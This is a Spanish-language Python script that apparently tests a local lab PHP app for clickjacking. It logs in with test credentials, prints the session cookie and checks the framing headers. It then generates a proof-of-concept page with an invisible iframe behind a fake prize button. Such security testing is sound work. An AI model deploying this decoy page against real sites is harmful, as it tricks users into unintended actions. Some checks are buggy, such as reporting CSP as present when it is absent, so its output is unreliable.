import requests
import webbrowser
import os
import textwrap
import sys

'''VERIFICAR VULNERABILIDAD DE CLICKJACKING EN LOGIN.PHP'''

BOLD = '\033[1m'
END = '\033[0m'


def check_login_vulnerability():
    """Verifica si home.php es vulnerable
    Es vulnerable si:
    - No tiene X-Frame-Options
    - No tiene Content-Security-Policy con frame-ancestors
    - Permite GET (posible CSRF via clickjacking)
    - No tiene token CSRF"""

    session = requests.Session()  
    
    url = "http://localhost:81/login_action.php"

    try:
        # Intentamos acceder e iniciar sesión:
        data={
            'usuario': 'Juan', 
            'password': '123'}

        resp = session.post(url, data=data)
        data = resp.json()

        if data.get("status") == "ok":
            print("Login correcto")

            # ➤ CAPTURAR LA COOKIE DE SESIÓN
            phpsessid = session.cookies.get("PHPSESSID")
            print("COOKIE DE SESIÓN:", phpsessid)

            # Construir URL de redirección (tu JS elimina .php, pero en backend tienes home.php)
            redirect_url = data["redirect"]
            full_url = f"http://localhost:81/{redirect_url}"

            # Acceder a home.php con la cookie de sesión válida
            response = session.get(full_url)
            #print(response.text)

        else:
            print("Login fallido:", data.get("message"))
            sys.exit()

        # Analizamos home  

        headers = response.headers
        print(f"Status Code: {response.status_code}")
        
        # Verificar redirección
        if response.status_code in [301, 302, 303, 307, 308]:
            redirect_to = headers.get('Location', 'Desconocido')
            print(f"redirección: {redirect_to}\n")
        
        # Verificar cabeceras de seguridad
        print(f"\n{BOLD}  CABECERAS DE SEGURIDAD:{END}\n")
        
        vulnerabilities = []
        
        # X-Frame-Options
        xfo = headers.get('X-Frame-Options')
        if xfo:
            print("X-Frame-Options: PRESENTE")
        else:
            print(f"X-Frame-Options: NO PRESENTE{END}")
            vulnerabilities.append('X-Frame-Options')

        # CSP
        csp = headers.get('Content-Security-Policy')
        if csp:
            print("Content-Security-Policy: PRESENTE")
            if 'frame-ancestors' in csp.lower():
                print("   frame-ancestors configurado")
            else:
                print("   frame-ancestors NO configurado")
                vulnerabilities.append('CSP frame-ancestors')
        else:
            print("Content-Security-Policy: PRESENTE")
            vulnerabilities.append('CSP')
        
        print(f"\n{BOLD}{'='*70}{END}")
        
        # Análisis adicional para home
        print(f"\n{BOLD} Análisis de home:{END}\n")
        
        # Verificar método HTTP
        methods_to_test = ['GET', 'POST']
        for method in methods_to_test:
            try:
                test_response = requests.request(method, url, timeout=3, allow_redirects=False)
                if test_response.status_code != 405:  # 405 = Method Not Allowed
                    print("Permitido método:", method)
                    if method == 'GET':
                        print("GET permite CSRF via clickjacking")
            except:
                pass
        
        # Verificar si requiere token CSRF
        if 'token' in response.text.lower() or 'csrf' in response.text.lower():
            print("Posible CSRF token presente")
        else:
            print("No se detectó protección CSRF")
            vulnerabilities.append('Sin protección CSRF')
        
        # Resultado final
        print(f"\n{BOLD}{'='*70}{END}")
        vulnerable= True
        if vulnerabilities:
            print("Vulnerabilidades detectadas:")
            for vuln in vulnerabilities:
                print(f"  • {vuln}")
            print()
        else:
            print("Protegido contra clickjacking en home.php\n")
            vulnerable= False
    except requests.exceptions.ConnectionError:
        print("No se pudo conectar a ", url)
        return None
    except Exception as e:
        print("Error durante la verificación:", str(e))
        return None

    # GENERAR POC CLICKJACKING si es vulnerable: 
    if vulnerable:
        target_url="http://localhost:81/home.php"
        output_file='poc.html'
        # OBTENER COOKIE PHPSESSID DE LA SESIÓN AUTENTICADA
        phpsessid = phpsessid
        print("Cookie de sesión capturada:", phpsessid)

        """Genera el archivo HTML de explotación"""
        poc = textwrap.dedent(f"""<!DOCTYPE html>
        <html lang="es">
        <head>
            <meta charset="UTF-8">
            <title>PoC Clickjacking</title>
            <script>
                document.cookie = "PHPSESSID={phpsessid}; path=localhost:81/home.php";
            </script>
            <style>
            body {{
                font-family: Arial, sans-serif;
                background: #8458b6;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
            }}
            .container {{
                background: white;
                padding: 40px;
                border-radius: 20px;
                text-align: center;
                position: relative;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            }}
            h1 {{
                color: #333;
                margin-bottom: 30px;
            }}
            .fake-button {{
                position: absolute;
                top: 200px;
                left: 50%;
                transform: translateX(-50%);
                background: #624b77;
                color: white;
                padding: 25px 60px;
                border-radius: 50px;
                cursor: pointer;
                font-size: 1.8em;
                font-weight: bold;
                z-index: 1;
                pointer-events: none;
            }}
            .malicious-iframe {{
                position: absolute;
                top: 52%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 800px;
                height: 700px;
                border: none;
                opacity: 0; /* Cambiar a 0.5 para demostraciones */
                z-index: 2;
            }}
            
        </style>
    </head>
    <body>
        <div class="container">
            <h1> ¡Gana un Premio! </h1>
            <button class="fake-button">¡PARTICIPAR AHORA!</button>
            <iframe class="malicious-iframe" src="{target_url}"></iframe>
        </div>
    </body>
    </html>""")


        with open(output_file, 'w', encoding='utf-8') as f:
                f.write(poc)
        
        print(f"\n PoC generado: {output_file}")
        #webbrowser.open(output_file)

def main():
    #verificar vulnerabilidad
    check_login_vulnerability()
    

if __name__ == '__main__':
    main()